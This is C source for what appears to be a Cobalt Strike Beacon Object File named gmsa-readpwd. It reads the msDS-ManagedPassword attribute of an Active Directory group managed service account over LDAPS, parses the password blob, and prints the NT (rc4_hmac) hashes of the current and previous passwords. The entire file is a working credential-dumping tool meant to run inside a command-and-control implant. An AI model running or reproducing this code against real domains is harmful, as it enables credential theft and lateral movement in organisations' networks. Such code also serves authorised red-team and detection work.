#include <windows.h>
#include <winldap.h>
#include "beacon.h"

typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_HASH_HANDLE;

DECLSPEC_IMPORT LDAP *          WLDAP32$ldap_sslinitW       (PWSTR HostName, ULONG PortNumber, int secure);
DECLSPEC_IMPORT LDAP *          WLDAP32$ldap_initW          (PWSTR HostName, ULONG PortNumber);
DECLSPEC_IMPORT ULONG           WLDAP32$ldap_bind_sW        (LDAP * ld, PWSTR dn, PWSTR cred, ULONG method);
DECLSPEC_IMPORT ULONG           WLDAP32$ldap_search_sW      (LDAP * ld, PWSTR base, ULONG scope, PWSTR filter, PWSTR attrs[], ULONG attrsonly, LDAPMessage ** res);
DECLSPEC_IMPORT LDAPMessage *   WLDAP32$ldap_first_entry    (LDAP * ld, LDAPMessage * res);
DECLSPEC_IMPORT struct berval **WLDAP32$ldap_get_values_lenW(LDAP * ld, LDAPMessage * entry, PWSTR attr);
DECLSPEC_IMPORT ULONG           WLDAP32$ldap_value_free_len (struct berval ** vals);
DECLSPEC_IMPORT ULONG           WLDAP32$ldap_msgfree        (LDAPMessage * res);
DECLSPEC_IMPORT ULONG           WLDAP32$ldap_unbind         (LDAP * ld);
DECLSPEC_IMPORT PWSTR           WLDAP32$ldap_err2stringW    (ULONG err);
DECLSPEC_IMPORT ULONG           WLDAP32$LdapGetLastError    (void);
DECLSPEC_IMPORT ULONG           WLDAP32$ldap_set_optionW    (LDAP * ld, int option, void * value);

DECLSPEC_IMPORT LONG __stdcall BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE * phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
DECLSPEC_IMPORT LONG __stdcall BCRYPT$BCryptCreateHash(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_HASH_HANDLE * phHash, PUCHAR pbHashObject, ULONG cbHashObject, PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);
DECLSPEC_IMPORT LONG __stdcall BCRYPT$BCryptHashData(BCRYPT_HASH_HANDLE hHash, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);
DECLSPEC_IMPORT LONG __stdcall BCRYPT$BCryptFinishHash(BCRYPT_HASH_HANDLE hHash, PUCHAR pbOutput, ULONG cbOutput, ULONG dwFlags);
DECLSPEC_IMPORT LONG __stdcall BCRYPT$BCryptDestroyHash(BCRYPT_HASH_HANDLE hHash);
DECLSPEC_IMPORT LONG __stdcall BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);


#pragma pack(push, 1)
typedef struct {
    WORD  Version;
    WORD  Reserved;
    DWORD Length;
    WORD  CurrentPasswordOffset;
    WORD  PreviousPasswordOffset;
    WORD  QueryPasswordIntervalOffset;
    WORD  UnchangedPasswordIntervalOffset;
} MANAGED_PASSWORD_BLOB;
#pragma pack(pop)

#define BLOB_HEADER_SIZE    16

#ifndef LDAP_OPT_SIGN
#define LDAP_OPT_SIGN       0x95
#endif
#ifndef LDAP_OPT_ENCRYPT
#define LDAP_OPT_ENCRYPT    0x96
#endif


static int _compute_md4(const BYTE * data, DWORD length, BYTE output[16])
{
    BCRYPT_ALG_HANDLE  algorithm_handle = NULL;
    BCRYPT_HASH_HANDLE hash_handle      = NULL;
    int result = -1;

    if (BCRYPT$BCryptOpenAlgorithmProvider(&algorithm_handle, L"MD4", NULL, 0) != 0) {
        return -1;
    }

    if (BCRYPT$BCryptCreateHash(algorithm_handle, &hash_handle, NULL, 0, NULL, 0, 0) != 0) {
        goto cleanup;
    }

    if (BCRYPT$BCryptHashData(hash_handle, (PUCHAR)data, length, 0) != 0) {
        goto cleanup;
    }

    if (BCRYPT$BCryptFinishHash(hash_handle, output, 16, 0) != 0) {
        goto cleanup;
    }

    result = 0;

cleanup:
    if (hash_handle) { BCRYPT$BCryptDestroyHash(hash_handle); }
    if (algorithm_handle) { BCRYPT$BCryptCloseAlgorithmProvider(algorithm_handle, 0); }
    return result;
}


static void _to_hex(const BYTE * data, DWORD length, char * output)
{
    static const char hex_chars[] = "0123456789abcdef";

    for (DWORD i = 0; i < length; i++) {
        output[i * 2]     = hex_chars[data[i] >> 4];
        output[i * 2 + 1] = hex_chars[data[i] & 0x0f];
    }
    output[length * 2] = '\0';
}


static void _build_filter(wchar_t * output, size_t capacity, const wchar_t * name)
{
    static const wchar_t prefix[] = L"(sAMAccountName=";
    size_t position    = 0;
    int    name_length = 0;

    for (size_t i = 0; prefix[i] && position < capacity - 1; i++) {
        output[position++] = prefix[i];
    }

    for (size_t i = 0; name[i] && position < capacity - 1; i++) {
        output[position++] = name[i];
        name_length++;
    }

    if (name_length == 0 || name[name_length - 1] != L'$') {
        if (position < capacity - 1) { output[position++] = L'$'; }
    }

    if (position < capacity - 1) { output[position++] = L')'; }
    output[position] = L'\0';
}


void go(IN char * args, IN int alen)
{
    datap   parser;
    PWSTR   domain_controller;
    PWSTR   gmsa_name;
    PWSTR   search_base_dn;

    LDAP           * ldap_handle   = NULL;
    LDAPMessage    * search_result = NULL;
    LDAPMessage    * entry;
    struct berval ** values        = NULL;
    ULONG            ldap_result;
    ULONG            version       = LDAP_VERSION3;

    wchar_t filter[512];
    PWSTR   attributes[2];

    BYTE                  * blob;
    DWORD                   blob_length;
    MANAGED_PASSWORD_BLOB * blob_header;
    WORD                    password_start;
    WORD                    password_end;
    DWORD                   password_length;

    BYTE md4_hash[16];
    char hex_string[33];

    BeaconDataParse(&parser, args, alen);
    domain_controller = (PWSTR) BeaconDataExtract(&parser, NULL);
    gmsa_name         = (PWSTR) BeaconDataExtract(&parser, NULL);
    search_base_dn    = (PWSTR) BeaconDataExtract(&parser, NULL);

    if (!domain_controller || !gmsa_name || !search_base_dn) {
        BeaconPrintf(CALLBACK_ERROR, "[!] usage: gmsa-readpwd <dc> <gmsa_name> <search_base_dn>");
        return;
    }

    _build_filter(filter, sizeof(filter) / sizeof(wchar_t), gmsa_name);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] filter: %ls", filter);

    ldap_handle = WLDAP32$ldap_sslinitW(domain_controller, 636, 1);
    if (!ldap_handle) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_sslinit(636) failed: 0x%lx", WLDAP32$LdapGetLastError());
        return;
    }

    WLDAP32$ldap_set_optionW(ldap_handle, LDAP_OPT_PROTOCOL_VERSION, &version);

    ldap_result = WLDAP32$ldap_bind_sW(ldap_handle, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ldap_result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_bind_s(LDAPS) failed: %ls (0x%lx) -- check DC certificate trust", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] bound (LDAPS + SSPI Negotiate)");

    attributes[0] = (PWSTR) L"msDS-ManagedPassword";
    attributes[1] = NULL;

    ldap_result = WLDAP32$ldap_search_sW(ldap_handle, search_base_dn, LDAP_SCOPE_SUBTREE, filter, attributes, 0, &search_result);
    if (ldap_result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_search_s failed: %ls (0x%lx)", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
        goto cleanup;
    }

    entry = WLDAP32$ldap_first_entry(ldap_handle, search_result);
    if (!entry) {
        BeaconPrintf(CALLBACK_ERROR, "[!] no results for %ls -- verify gMSA name", filter);
        goto cleanup;
    }

    values = WLDAP32$ldap_get_values_lenW(ldap_handle, entry, (PWSTR) L"msDS-ManagedPassword");
    if (!values || !values[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[!] msDS-ManagedPassword not returned -- current token " "not authorized (not in msDS-GroupMSAMembership)");
        goto cleanup;
    }

    blob        = (BYTE *) values[0]->bv_val;
    blob_length = (DWORD)  values[0]->bv_len;

    if (blob_length < BLOB_HEADER_SIZE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] blob too small: %lu bytes (need >= %u)", (unsigned long) blob_length, BLOB_HEADER_SIZE);
        goto cleanup;
    }

    blob_header = (MANAGED_PASSWORD_BLOB *) blob;

    if (blob_header->Version != 1) {
        BeaconPrintf(CALLBACK_ERROR, "[!] unexpected blob version: %u (expected 1)", blob_header->Version);
        goto cleanup;
    }

    password_start = blob_header->CurrentPasswordOffset;
    password_end   = (blob_header->PreviousPasswordOffset != 0)
                         ? blob_header->PreviousPasswordOffset
                         : blob_header->QueryPasswordIntervalOffset;

    if (password_start >= blob_length || password_end > blob_length || password_end <= password_start) {
        BeaconPrintf(CALLBACK_ERROR, "[!] invalid offsets: current=%u end=%u blob=%lu", password_start, password_end, (unsigned long) blob_length);
        goto cleanup;
    }

    password_length = password_end - password_start;

    if (password_length >= 2) { password_length -= 2; }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] blob: %lu bytes, current password: %lu bytes", (unsigned long) blob_length, (unsigned long) password_length);

    if (_compute_md4(blob + password_start, password_length, md4_hash) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] BCrypt MD4 failed -- algorithm may be disabled by policy");
        goto cleanup;
    }

    _to_hex(md4_hash, 16, hex_string);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] rc4_hmac             : %s", hex_string);

    if (blob_header->PreviousPasswordOffset != 0) {
        WORD  previous_start  = blob_header->PreviousPasswordOffset;
        WORD  previous_end    = blob_header->QueryPasswordIntervalOffset;
        DWORD previous_length;

        if (previous_start < blob_length && previous_end <= blob_length &&
            previous_end > previous_start) {
            previous_length = previous_end - previous_start;
            if (previous_length >= 2) { previous_length -= 2; }

            if (_compute_md4(blob + previous_start, previous_length, md4_hash) == 0) {
                _to_hex(md4_hash, 16, hex_string);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] rc4_hmac (previous)  : %s", hex_string);
            }
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] no previous password in blob");
    }

cleanup:
    if (values) { WLDAP32$ldap_value_free_len(values); }
    if (search_result) { WLDAP32$ldap_msgfree(search_result); }
    if (ldap_handle) { WLDAP32$ldap_unbind(ldap_handle); }
}
